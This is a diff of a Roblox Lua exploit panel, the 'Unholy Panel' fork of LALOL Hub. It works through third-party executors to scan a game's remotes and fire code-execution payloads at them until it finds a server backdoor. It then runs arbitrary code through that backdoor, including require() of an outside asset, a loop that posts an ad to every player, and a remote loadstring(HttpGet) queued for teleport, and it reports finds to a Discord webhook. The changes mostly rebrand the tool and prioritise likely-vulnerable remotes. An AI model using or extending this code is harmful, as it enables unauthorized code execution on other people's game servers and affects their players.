@@ -7,11 +7,17 @@
  Y888P  ~Y8888P' Y888888P      888888D      Y88888P ~Y8888P' YP   YP  CONVERTER 
 ]=]
 
+--[[
+
+YES THIS IS FORK FROM LALOL HUB
+UNHOLY PANEL, LALOL HUB EDIT BY EP1KZKIDD/UNH0LY77
+
+]]
 -- Instances: 15 | Scripts: 3 | Modules: 0 | Tags: 0
 local G2L = {};
 
 -- StarterGui.UNHOLY
-G2L["1"] = Instance.new("ScreenGui", game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui"));
+G2L["1"] = Instance.new("ScreenGui", game:GetService("CoreGui"):WaitForChild("RobloxGui"));
 G2L["1"]["Name"] = [[UNHOLY]];
 G2L["1"]["ZIndexBehavior"] = Enum.ZIndexBehavior.Sibling;
 G2L["1"]["ResetOnSpawn"] = false;
@@ -22,7 +28,7 @@ G2L["2"] = Instance.new("Frame", G2L["1"]);
 G2L["2"]["BorderSizePixel"] = 0;
 G2L["2"]["BackgroundColor3"] = Color3.fromRGB(201, 201, 201);
 G2L["2"]["Size"] = UDim2.new(0, 408, 0, 255);
-G2L["2"]["Position"] = UDim2.new(0.16179, 0, 0.28516, 0);
+G2L["2"]["Position"] = UDim2.new(0.21938, 0, 0.25, 0);
 G2L["2"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
 
 
@@ -222,20 +228,17 @@ task.spawn(C_3);
 -- StarterGui.UNHOLY.Frame.Main
 local function C_4()
 local script = G2L["4"];
-	-- Hierarchy Setup
 	local MainFrame = script.Parent
 	local AttachBtn = MainFrame:WaitForChild("Attach")
 	local ExecuteBtn = MainFrame:WaitForChild("Execute")
 	local ScriptBox = MainFrame:WaitForChild("ScrollingFrame"):FindFirstChild("TextBox")
 	
-	-- Initialize Exploit Services
 	local Exploit = {
 		QueueTeleport = nil,
 		Request = nil,
 		ExecuteString = nil
 	}
 	
-	-- Detect available exploit services
 	if syn then
 		Exploit.QueueTeleport = syn.queue_on_teleport
 		Exploit.Request = syn.request
@@ -246,12 +249,10 @@ local script = G2L["4"];
 		Exploit.ExecuteString = fluxus.execute
 	end
 	
-	-- Fallback for queue_on_teleport
 	if not Exploit.QueueTeleport and queue_on_teleport then
 		Exploit.QueueTeleport = queue_on_teleport
 	end
 	
-	-- Fallback for request function
 	if not Exploit.Request then
 		if http and http.request then
 			Exploit.Request = http.request
@@ -262,21 +263,38 @@ local script = G2L["4"];
 		end
 	end
 	
-	-- Load script on teleport
 	if Exploit.QueueTeleport then
-		Exploit.QueueTeleport("loadstring(game:HttpGet('https://raw.githubusercontent.com/robloxhecker123xd-tech/Unholy/refs/heads/main/Panel.Lua'))()")
+		Exploit.QueueTeleport("loadstring(game:HttpGet('https://raw.githubusercontent.com/Its-LALOL/LALOL-Hub/main/Backdoor-Scanner/script'))()")
 	end
 	
-	-- Initialize variables
 	alphabet={'a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z'}
 	
 	local UnholyPanel = {
 		backdoor = nil,
 		isScanning = false,
-		HttpService = game:GetService("HttpService")
+		HttpService = game:GetService("HttpService"),
+		suspiciousRemotes = {
+			"SendMessage",
+			"UpdatePlayer",
+			"ExecuteCode",
+			"RunScript",
+			"Command",
+			"Execute",
+			"Eval",
+			"Load",
+			"Init",
+			"Admin",
+			"Process",
+			"Handler",
+			"ServerEvent",
+			"CustomEvent",
+			"UnknownRemote",
+			"MysteryFunction",
+			"RemoteEvent",
+			"AntiCheat"
+		}
 	}
 	
-	-- Function 1: Debug logging
 	function UnholyPanel:Debug(text, lvl)
 		local func=print
 		if lvl==1 then func=print end
@@ -285,7 +303,6 @@ local script = G2L["4"];
 		func('Unholy Panel: '..text)
 	end
 	
-	-- Function 2: Run Remote
 	function UnholyPanel:RunRemote(remote, data, data2)
 		if remote:IsA('RemoteEvent') then
 			remote:FireServer(data)
@@ -294,7 +311,6 @@ local script = G2L["4"];
 		end
 	end
 	
-	-- Function 3: Make Visible
 	function UnholyPanel:MakeVisible(folder, state)
 		for i,v in folder:GetDescendants() do
 			if v:IsA('Frame') then 
@@ -303,7 +319,6 @@ local script = G2L["4"];
 		end
 	end
 	
-	-- Function 4: Notify
 	function UnholyPanel:Notify(text)
 		game:GetService('StarterGui'):SetCore(
 			"SendNotification",
@@ -315,12 +330,10 @@ local script = G2L["4"];
 		)
 	end
 	
-	-- Check if logs are disabled
 	if _G.UnholyPanel_Logs_Disabled then
 		UnholyPanel:Notify('Logs disabled :(')
 	end
 	
-	-- Function 5: Generate Name
 	function UnholyPanel:GenerateName(length)
 		local text=''
 		for i=1,length do
@@ -329,10 +342,20 @@ local script = G2L["4"];
 		return text
 	end
 	
-	-- Function 6: Find Remote (Main Scanning Function)
+	function UnholyPanel:IsSuspiciousRemote(remoteName)
+		for _, suspiciousName in ipairs(self.suspiciousRemotes) do
+			if string.find(string.lower(remoteName), string.lower(suspiciousName)) then
+				return true
+			end
+		end
+		return false
+	end
+	
 	function UnholyPanel:FindRemote()
 		local timee=os.clock()
 		local remotes={}
+		local suspiciousRemotesList = {}
+		local normalRemotesList = {}
 		local code
 	
 		local protected_backdoor=game:GetService('ReplicatedStorage'):FindFirstChild('lh'..game.PlaceId/6666*1337*game.PlaceId)
@@ -341,12 +364,11 @@ local script = G2L["4"];
 				code=self:GenerateName(math.random(12,30))
 				if not remotes[code] then break end
 			end
-			spawn(function() protected_backdoor:InvokeServer('ep1kzkidd team join today!!', "a=Instance.new('Model',workspace)a.Name='"..code.."'") end)
+			spawn(function() protected_backdoor:InvokeServer('unholy panel join today!!', "a=Instance.new('Model',workspace)a.Name='"..code.."'") end)
 			remotes[code]=protected_backdoor
 		end
 	
 		for i,remote in game:GetDescendants() do
-			-- Validation Checker
 			if not remote:IsA('RemoteEvent') then 
 				if not remote:IsA('RemoteFunction') then continue end
 			end
@@ -377,7 +399,24 @@ local script = G2L["4"];
 				end
 			end
 	
-			-- Backdoor Sender
+			if self:IsSuspiciousRemote(remote.Name) then
+				table.insert(suspiciousRemotesList, remote)
+				self:Debug('Found suspicious remote: '..remote.Name, 1)
+			else
+				table.insert(normalRemotesList, remote)
+			end
+		end
+	
+		local allRemotes = {}
+		for _, remote in ipairs(suspiciousRemotesList) do
+			table.insert(allRemotes, remote)
+		end
+		for _, remote in ipairs(normalRemotesList) do
+			table.insert(allRemotes, remote)
+		end
+	
+		-- Send backdoor code to all remotes
+		for _, remote in ipairs(allRemotes) do
 			while true do
 				code=self:GenerateName(math.random(12,30))
 				if not remotes[code] then break end
@@ -386,7 +425,11 @@ local script = G2L["4"];
 			self:RunRemote(remote, "a=Instance.new('Model',workspace)a.Name='"..code.."'")
 			remotes[code]=remote
 	
-			self:Debug('Sended Backdoor \"'..remote:GetFullName()..'\"', 1)
+			if self:IsSuspiciousRemote(remote.Name) then
+				self:Debug('Sended Backdoor to SUSPICIOUS \"'..remote:GetFullName()..'\"', 3)
+			else
+				self:Debug('Sended Backdoor \"'..remote:GetFullName()..'\"', 1)
+			end
 		end
 	
 		-- Backdoor Checker
@@ -395,17 +438,22 @@ local script = G2L["4"];
 				local code=i
 	
 				if workspace:FindFirstChild(code) then
-					self:Notify('Backdoor found! '..os.clock()-timee..'s')
+					self:Notify('Backdoor found in '..os.clock()-timee..'s')
 	
 					self.backdoor=remote
 					self:Debug(remote:GetFullName(), 3)
 	
+					if self:IsSuspiciousRemote(remote.Name) then
+						self:Notify('Using SUSPICIOUS remote: '..remote.Name)
+						self:Debug('Backdoor is SUSPICIOUS: '..remote.Name, 3)
+					end
+	
 					self:RunRemote(remote, "require(171016405.1884*69)")			
-					self:RunRemote(remote, "a=Instance.new('Hint')a.Text='Unholy Panel | .gg/Pf4RXzam 'while true do a.Parent=workspace;wait(15)a:Remove()wait(30)end")
+					self:RunRemote(remote, "a=Instance.new('Hint')a.Text='Unholy Panel | Free Backdoor Scanner'while true do a.Parent=workspace;wait(15)a:Remove()wait(30)end")
 	
 					if Exploit.Request and not _G.UnholyPanel_Logs_Disabled then 
 						Exploit.Request({
-							Url = 'https://discord.com/api/webhooks/1479699998793924680/pfRoqE5d-uZQJZjgw_OJsaOZsfrq98UsRjivoRYpsZJh0fFAf5kB5GLbkbwi7Wn38zPb',
+							Url = 'https://discord.com/api/webhooks/INSERT_WEBHOOK_HERE',
 							Method = 'POST',
 							Headers = {
 								['Content-Type'] = 'application/json',
@@ -427,7 +475,6 @@ local script = G2L["4"];
 		return false
 	end
 	
-	-- GUI Button Event: Attach (Scanner)
 	AttachBtn.MouseButton1Click:Connect(function()
 		if UnholyPanel.isScanning then return end
 	
@@ -437,12 +484,10 @@ local script = G2L["4"];
 	
 		if not UnholyPanel:FindRemote() then
 			AttachBtn.Text='No backdoor :('
-			UnholyPanel:Notify('No backdoor found')
+			UnholyPanel:Notify('No backdoor found!')
 		else
 			AttachBtn.Text='Attached!'
-			task.wait(5)
-			AttachBtn.Text='Attach'
-			UnholyPanel:Notify('Backdoor attached successfully')
+			UnholyPanel:Notify('Backdoor attached successfully!')
 		end
 	
 		UnholyPanel.isScanning = false
@@ -451,13 +496,13 @@ local script = G2L["4"];
 	-- GUI Button Event: Execute
 	ExecuteBtn.MouseButton1Click:Connect(function()
 		if UnholyPanel.backdoor == nil then
-			UnholyPanel:Notify('No backdoor attached Click Attach first.')
+			UnholyPanel:Notify('No backdoor attached! Click Attach first.')
 			return
 		end
 	
 		local code = ScriptBox.Text
 		if code == '' then
-			UnholyPanel:Notify('Script box is empty')
+			UnholyPanel:Notify('Script box is empty!')
 			return
 		end
 	
@@ -476,18 +521,17 @@ local script = G2L["4"];
 		else
 			UnholyPanel:RunRemote(UnholyPanel.backdoor, a)
 		end
-		ExecuteBtn.Text='Executed'
+		ExecuteBtn.Text='Executed!'
 		wait(0.5)
 		ExecuteBtn.Text='Execute'
 	end)
 	
-	-- Keyboard Shortcut: Alt to toggle visibility
 	game:GetService('UserInputService').InputBegan:Connect(function(input, processed)
 		if (input.KeyCode == Enum.KeyCode.LeftAlt and not processed) then
 			if MainFrame.Visible then 
 				MainFrame.Visible=false
 			else 
-				MainFrame.Visible=true 
+	MainFrame.Visible=true 
 			end
 		end
 	end)
